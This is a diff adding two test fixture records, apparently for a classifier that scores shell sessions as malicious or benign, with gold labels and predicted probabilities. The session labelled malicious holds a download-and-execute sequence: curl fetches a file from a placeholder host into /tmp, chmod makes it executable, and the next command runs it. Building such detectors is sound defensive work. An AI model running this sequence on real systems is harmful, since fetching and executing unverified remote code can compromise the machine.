@@ -1,0 +1,2 @@
+{"session_id":"audit-benign","commands":[{"cmd":"whoami","dt":0.1}],"gold":{"malicious":0},"prediction":{"malicious_probability":0.01},"meta":{"source":"fixture"}}
+{"session_id":"audit-malicious","commands":[{"cmd":"curl -o /tmp/a https://example.invalid/a","dt":0.1},{"cmd":"chmod +x /tmp/a","dt":0.2},{"cmd":"/tmp/a","dt":0.1}],"gold":{"malicious":1,"first_evidence_index":2},"prediction":{"malicious_probability":0.96},"meta":{"source":"fixture"}}
